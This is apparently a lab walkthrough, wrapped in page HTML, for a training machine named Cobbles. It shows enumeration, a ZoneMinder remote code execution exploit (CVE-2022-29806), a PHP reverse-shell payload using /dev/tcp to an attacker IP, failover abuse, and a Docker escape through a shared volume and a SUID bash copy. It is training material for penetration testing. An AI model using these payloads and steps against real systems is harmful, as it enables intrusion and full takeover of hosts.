@@ -1,0 +1,257 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-black"><!----><div><h1>Summary</h1>
+<p>In this guide we will exploit an RCE vulnerability in <code>ZoneMinder v1.34.23</code> to gain initial access before escalating privileges via docker abuse to obtain <code>root</code> access</p>
+<h2>Enumeration</h2>
+<p>We begin the enumeration process with an <code>nmap</code> scan.</p>
+<pre id="fence-code-1" class="fence-code"><code>kali@kali:~$ sudo nmap -sV -sC 192.168.120.140
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-04 16:38 WIB
+Nmap scan report for 192.168.120.140
+Host is up (0.00041s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 81:83:bd:6e:4a:e0:52:4b:39:44:84:9f:3e:63:ef:80 (RSA)
+|   256 2b:49:e8:18:72:f9:7d:2c:98:c8:a6:d5:7b:08:c6:39 (ECDSA)
+|_  256 1a:e1:c7:8e:20:89:67:48:6b:14:46:5d:f6:89:c0:ce (ED25519)
+80/tcp open  http    Apache httpd 2.4.51
+|_http-server-header: Apache/2.4.51 (Debian)
+|_http-title: Cobbles
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
+</code></pre>
+<p>Starting with port <code>80</code>, we run a <code>nikto</code> scan on the target</p>
+<pre id="fence-code-2" class="fence-code"><code>kali@kali:~$ nikto -host http://192.168.120.140/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.120.140
++ Target Hostname:    192.168.120.140
++ Target Port:        80
++ Start Time:         2021-11-04 16:59:21 (GMT7)
+---------------------------------------------------------------------------
+...
++ Uncommon header 'x-backend-server' found, with contents: primary
++ OSVDB-561: /server-status: This reveals Apache information...
+...
++ 7916 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2021-11-04 16:59:37 (GMT7) (16 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre>
+<p>From the results of our scan we notice the <code>x-backend-server</code> header and it's contents <code>primary</code>, hinting that our target may be sitting behind a load balancer.</p>
+<p>We also notice the <code>/server-status</code> path is accessible and reveals <code>Apache</code> information.</p>
+<p>We confirm our suspicions about the target sitting behind a load balancer via <code>curl</code>:</p>
+<pre id="fence-code-3" class="fence-code"><code>kali@kali:~$ curl http://192.168.120.140/server-status
+...
+&lt;title&gt;Apache Status&lt;/title&gt;
+...
+&lt;h1&gt;Apache Server Status for 192.168.120.140 (via 127.0.0.1)&lt;/h1&gt;
+
+&lt;dl&gt;&lt;dt&gt;Server Version: Apache/2.4.51 (Debian)&lt;/dt&gt;
+&lt;dt&gt;Server MPM: prefork&lt;/dt&gt;
+&lt;dt&gt;Server Built: 2021-10-07T17:49:44
+
+...
+&lt;tr&gt;&lt;td&gt;&lt;b&gt;3-0&lt;/b&gt;&lt;/td&gt;&lt;td&gt;659&lt;/td&gt;&lt;td&gt;0/2390/2390&lt;/td&gt;&lt;td&gt;_
+&lt;/td&gt;&lt;td&gt;25.03&lt;/td&gt;&lt;td&gt;8&lt;/td&gt;&lt;td&gt;134&lt;/td&gt;&lt;td&gt;68034&lt;/td&gt;&lt;td&gt;0.0&lt;/td&gt;&lt;td&gt;3.85&lt;/td&gt;&lt;td&gt;3.85
+&lt;/td&gt;&lt;td&gt;127.0.0.1&lt;/td&gt;&lt;td&gt;http/1.1&lt;/td&gt;&lt;td nowrap&gt;127.0.0.1:8080&lt;/td&gt;&lt;td nowrap&gt;GET /zm-prod/ HTTP/1.0&lt;/td&gt;&lt;/tr&gt;
+
+&lt;tr&gt;&lt;td&gt;&lt;b&gt;4-0&lt;/b&gt;&lt;/td&gt;&lt;td&gt;660&lt;/td&gt;&lt;td&gt;0/2391/2391&lt;/td&gt;&lt;td&gt;_
+&lt;/td&gt;&lt;td&gt;0.09&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;90&lt;/td&gt;&lt;td&gt;0.0&lt;/td&gt;&lt;td&gt;0.34&lt;/td&gt;&lt;td&gt;0.34
+&lt;/td&gt;&lt;td&gt;127.0.0.1&lt;/td&gt;&lt;td&gt;http/1.1&lt;/td&gt;&lt;td nowrap&gt;127.0.0.1:8080&lt;/td&gt;&lt;td nowrap&gt;GET /cgi-bin/config.exp HTTP/1.1&lt;/td&gt;&lt;/tr&gt;
+
+&lt;tr&gt;&lt;td&gt;&lt;b&gt;5-0&lt;/b&gt;&lt;/td&gt;&lt;td&gt;661&lt;/td&gt;&lt;td&gt;0/2392/2392&lt;/td&gt;&lt;td&gt;_
+&lt;/td&gt;&lt;td&gt;3.81&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;107&lt;/td&gt;&lt;td&gt;7852&lt;/td&gt;&lt;td&gt;0.0&lt;/td&gt;&lt;td&gt;3.28&lt;/td&gt;&lt;td&gt;3.28
+&lt;/td&gt;&lt;td&gt;127.0.0.1&lt;/td&gt;&lt;td&gt;http/1.1&lt;/td&gt;&lt;td nowrap&gt;127.0.0.1:8080&lt;/td&gt;&lt;td nowrap&gt;GET /zm-prod/ HTTP/1.0&lt;/td&gt;&lt;/tr&gt;
+
+&lt;tr&gt;&lt;td&gt;&lt;b&gt;6-0&lt;/b&gt;&lt;/td&gt;&lt;td&gt;662&lt;/td&gt;&lt;td&gt;0/2393/2393&lt;/td&gt;&lt;td&gt;&lt;b&gt;W&lt;/b&gt;
+&lt;/td&gt;&lt;td&gt;25.14&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;72575&lt;/td&gt;&lt;td&gt;0.0&lt;/td&gt;&lt;td&gt;3.93&lt;/td&gt;&lt;td&gt;3.93
+&lt;/td&gt;&lt;td&gt;127.0.0.1&lt;/td&gt;&lt;td&gt;http/1.1&lt;/td&gt;&lt;td nowrap&gt;127.0.0.1:8080&lt;/td&gt;&lt;td nowrap&gt;GET /server-status HTTP/1.1&lt;/td&gt;&lt;/tr&gt;
+</code></pre>
+<p>The output displays <code>via 127.0.0.1</code> confirming that our requests are being forwarded internally and that our target is sitting behind a load balancer.</p>
+<p>The <code>curl</code> output also reveals mutiple paths being requested, namely the <code>/zm-prod/</code> path requested multiple times.</p>
+<p>After navigating to the <code>/zm-prod/</code> path in our browser, we see the following console.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_124_image_1_kU97IA96.png" alt="ZoneMinder">
+<figcaption>ZoneMinder</figcaption>
+</figure>
+<p></p>
+<p><a href="https://zoneminder.com/" target="_blank">ZoneMinder</a> is an open source surveillance software, and the console reveals the version: <strong>v1.34.23</strong>.</p>
+<h1>Exploitation</h1>
+<h2>Remote Code Execution</h2>
+<p>After searching for potential exploits we find the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29806" target="_blank">CVE-2022-29806</a> advisory affecting <code>ZoneMinder</code> versions before <strong>1.36.13</strong> which directs us to the following <a href="https://github.com/krastanoel/exploits/blob/master/zoneminder-1.36.12-remote-code-execution/exploit.py" target="_blank">exploit</a>.</p>
+<p>We begin by downloading the exploit onto our attack machine</p>
+<pre id="fence-code-4" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ wget https://github.com/krastanoel/exploits/blob/master/zoneminder-1.36.12-remote-code-execution/exploit.py -O exploit.py
+--2022-07-08 03:03:58--  https://github.com/krastanoel/exploits/blob/master/zoneminder-1.36.12-remote-code-execution/exploit.py
+Resolving github.com (github.com)... 192.30.255.112
+Connecting to github.com (github.com)|192.30.255.112|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: ‘exploit.py’
+
+exploit.py                                         [ &lt;=&gt;                                                                                 ] 199.29K  1014KB/s    in 0.2s    
+
+2022-07-08 03:04:06 (1014 KB/s) - ‘exploit.py’ saved [204076]
+</code></pre>
+<p>Next, we will modify the <code>payload</code> variable with the following reverse shell payload.</p>
+<pre id="fence-code-5" class="fence-code"><code>kali@kali:~$ sed -i 's/172.17.0.1\/4444/192.168.120.3\/80/g' exploit.py
+kali@kali:~$ grep payload exploit.py
+payload = '''&lt;?php system("/bin/bash -c '/bin/bash -i &gt; /dev/tcp/192.168.120.3/80 0&lt;&amp;1 2&gt;&amp;1'"); ?&gt;'''
+...
+</code></pre>
+<p>We proceed by setting up a listener on port <code>80</code> using <code>netcat</code>:</p>
+<pre id="fence-code-6" class="fence-code"><code>kali@kali:~$ sudo nc -nlvp 80
+listening on [any] 80 ...
+</code></pre>
+<p>Finally, we execute the exploit.</p>
+<pre id="fence-code-7" class="fence-code"><code>kali@kali:~$ python exploit.py --rhost 192.168.120.140 --rport 80 --uri /zm-prod
+[*] 192.168.120.140:80 - The target appears to be vulnerable.
+[*] 192.168.120.140:80 - Leak installation directory path
+[*] 192.168.120.140:80 - Shell: ../../../../../tmp/6105b77375.php
+[*] 192.168.120.140:80 - The reverse shell will trigger in 5 seconds, make sure you have netcat already listen
+[*] 192.168.120.140:80 - Check your netcat
+</code></pre>
+<p>We receive a response in our listener</p>
+<pre id="fence-code-8" class="fence-code"><code>kali@kali:~$ sudo nc -nlvp 80
+listening on [any] 80 ...
+connect to [192.168.120.3] from (UNKNOWN) [192.168.120.140] 54400
+bash: cannot set terminal process group (392): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@cobbles:/usr/share/zoneminder/www$
+</code></pre>
+<h2>Privilege Esclation</h2>
+<p>After gaining access to the system as the user <code>www-data</code>, we check any services running on the system.</p>
+<pre id="fence-code-9" class="fence-code"><code>www-data@cobbles:/usr/share/zoneminder/www$ netstat -antup | grep -ni listen
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+3:tcp    0    0 0.0.0.0:22          0.0.0.0:*     LISTEN      -
+4:tcp    0    0 0.0.0.0:80          0.0.0.0:*     LISTEN      -
+5:tcp    0    0 127.0.0.1:8080      0.0.0.0:*     LISTEN      -
+6:tcp    0    0 127.0.0.1:8081      0.0.0.0:*     LISTEN      -
+7:tcp    0    0 127.0.0.1:3306      0.0.0.0:*     LISTEN      -
+</code></pre>
+<p>From the output we take note that ports <strong>8080</strong> and <strong>8081</strong> running</p>
+<p>We must also determine which processes utilize each port.</p>
+<pre id="fence-code-10" class="fence-code"><code>www-data@cobbles:/usr/share/zoneminder/www$ grep -nRw '8080\|8081' /etc/* 2&gt;/dev/null
+/etc/apache2/ports.conf:5:Listen 127.0.0.1:8080
+/etc/haproxy/haproxy.cfg:26:  server primary 127.0.0.1:8080 check
+/etc/haproxy/haproxy.cfg:27:  server secondary 127.0.0.1:8081 check backup
+...
+</code></pre>
+<p>The output reveals the <code>/etc/haproxy/haproxy.cfg</code> file</p>
+<pre id="fence-code-11" class="fence-code"><code>www-data@cobbles:/usr/share/zoneminder/www$ cat /etc/haproxy/haproxy.cfg
+...
+  bind 0.0.0.0:80 name app
+  default_backend bk_app
+
+backend bk_app
+  option httpchk GET /zm-prod/ HTTP/1.0
+  default-server inter 2s fall 60
+  http-check expect status 200
+  server primary 127.0.0.1:8080 check
+  server secondary 127.0.0.1:8081 check backup
+  http-response set-header x-backend-server %s
+</code></pre>
+<p>The <code>bind</code> parameter reveals the <code>haproxy</code> process listening on port <strong>80</strong></p>
+<p>There are also two backend servers with <code>secondary</code> as a backup server on port <strong>8081</strong>.</p>
+<p>The <code>http-check</code> expects a <code>200</code> HTTP response on the <code>/zm-prod/</code> path, and will switch to the backup server if the service is unavailable for two minutes.</p>
+<p>Let's check what happens after we ran the exploit using <code>curl</code>:</p>
+<pre id="fence-code-12" class="fence-code"><code>kali@kali:~$ curl -I http://192.168.120.140/zm-prod/
+HTTP/1.1 500 Internal Server Error
+date: Wed, 08 Dec 2021 10:05:15 GMT
+server: Apache/2.4.51 (Debian)
+set-cookie: ZMSESSID=hve22s2k33v0jsajqn4qrgulo7; ...
+x-backend-server: primary
+...
+</code></pre>
+<p>We receive a  <strong>500 Internal Server Error</strong> response, likely because we previously ran the exploit</p>
+<p>However after waiting for 2 minutes we check the <code>/zm-prod/</code> path again.</p>
+<pre id="fence-code-13" class="fence-code"><code>kali@kali:~$ curl -I http://192.168.120.140/zm-prod/
+HTTP/1.1 200 OK
+date: Wed, 08 Dec 2021 10:07:21 GMT
+server: nginx/1.18.0
+set-cookie: ZMSESSID=4tve9ghtnqjpuv42a1v5h2kj3a; ...
+x-backend-server: secondary
+</code></pre>
+<p>We receive a <strong>200 OK</strong> response, with the <code>server</code> and <code>x-backend-server</code> header values changing, indicating that the failover has been triggered.</p>
+<p>We will proceed by re-using our prior exploit</p>
+<p>We once again begin by setting up a listener on our attack machine</p>
+<pre id="fence-code-14" class="fence-code"><code>kali@kali:~$ sudo nc -nlvp 80
+listening on [any] 80 ...
+</code></pre>
+<p>We execute the exploit</p>
+<pre id="fence-code-15" class="fence-code"><code>kali@kali:~$ python exploit.py --rhost 192.168.120.140 --rport 80 --uri /zm-prod
+[*] 192.168.120.140:80 - The target appears to be vulnerable.
+[*] 192.168.120.140:80 - Leak installation directory path
+[*] 192.168.120.140:80 - Shell: ../../../../../tmp/25f230d8f2.php
+[*] 192.168.120.140:80 - The reverse shell will trigger in 5 seconds, make sure you have netcat already listen
+[*] 192.168.120.140:80 - Check your netcat
+</code></pre>
+<p>We receive a response in our listener</p>
+<pre id="fence-code-16" class="fence-code"><code>kali@kali:~$ sudo nc -nlvp 80
+listening on [any] 80 ...
+connect to [192.168.120.3] from (UNKNOWN) [192.168.120.140] 55876
+bash: cannot set terminal process group (254): Inappropriate ioctl for device
+bash: no job control in this shell
+root@5679367b8e00:/usr/share/zoneminder/www#
+</code></pre>
+<h2>Privilege Esclation (Docker)</h2>
+<p>After executing the exploit on the secondary server we have gained <code>root</code> access however after enumerating the target we find a <code>.dockerenv</code> file, confirming that we are on a docker container.</p>
+<pre id="fence-code-17" class="fence-code"><code>root@5679367b8e00:/usr/share/zoneminder/www# ls -la /
+total 80
+drwxr-xr-x   1 root root 4096 Oct 25 17:17 .
+drwxr-xr-x   1 root root 4096 Oct 25 17:17 ..
+-rwxr-xr-x   1 root root    0 Oct 25 17:17 .dockerenv
+...
+</code></pre>
+<p>We can use the <code>mount</code> command to check if our device volume is shared between our host and container.</p>
+<pre id="fence-code-18" class="fence-code"><code>root@5679367b8e00:/usr/share/zoneminder/www# mount
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2 ...
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+...
+/dev/sda1 on /etc/resolv.conf type ext4 (rw,noatime,errors=remount-ro)
+/dev/sda1 on /etc/hostname type ext4 (rw,noatime,errors=remount-ro)
+/dev/sda1 on /etc/hosts type ext4 (rw,noatime,errors=remount-ro)
+/dev/sda1 on /usr/share/zoneminder/www type ext4 (rw,noatime,errors=remount-ro)
+...
+</code></pre>
+<p>Let's create a file here as <code>root</code> and attempt to view it as the <code>www-data</code> user.</p>
+<pre id="fence-code-19" class="fence-code"><code>root@5679367b8e00:/usr/share/zoneminder/www# echo hello there! &gt; findme
+root@5679367b8e00:/usr/share/zoneminder/www#
+</code></pre>
+<p>We view the <code>findme</code> file on the host as the <code>www-data</code> user</p>
+<pre id="fence-code-20" class="fence-code"><code>www-data@cobbles:/usr/share/zoneminder/www$ ls -l
+total 68
+drwxr-xr-x 2 root root 4096 Oct 25 16:58 ajax
+drwxr-xr-x 4 root root 4096 Oct 25 16:58 api
+drwxr-xr-x 2 root root 4096 Oct 25 16:58 css
+-rw-r--r-- 1 root root   12 Dec 11 15:16 findme
+...
+www-data@cobbles:/usr/share/zoneminder/www$ cat findme
+hello there!
+</code></pre>
+<p>We have confirmed that the <code>findme</code> file has been created on the host and is accessible as the <code>www-data</code> user</p>
+<p>Now we can copy the <code>bash</code> binary and set the <code>SUID</code> bit.</p>
+<pre id="fence-code-21" class="fence-code"><code>root@5679367b8e00:/usr/share/zoneminder/www# cp /bin/bash .
+root@5679367b8e00:/usr/share/zoneminder/www# chmod +s bash
+root@5679367b8e00:/usr/share/zoneminder/www# ls -l bash
+-rwsr-sr-x 1 root root 1234376 Dec 11 15:27 bash
+</code></pre>
+<p>Finally, from the host we can escalate to <strong>root</strong> by executing the <code>bash</code> binary with privileged mode enabled.</p>
+<pre id="fence-code-22" class="fence-code"><code>www-data@cobbles:/usr/share/zoneminder/www$ ls -l
+total 1276
+drwxr-xr-x 2 root root    4096 Oct 25 16:58 ajax
+drwxr-xr-x 4 root root    4096 Oct 25 16:58 api
+-rwsr-sr-x 1 root root 1234376 Dec 11 15:27 bash
+...
+www-data@cobbles:/usr/share/zoneminder/www$ ./bash -p
+bash-5.1# whoami
+root
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
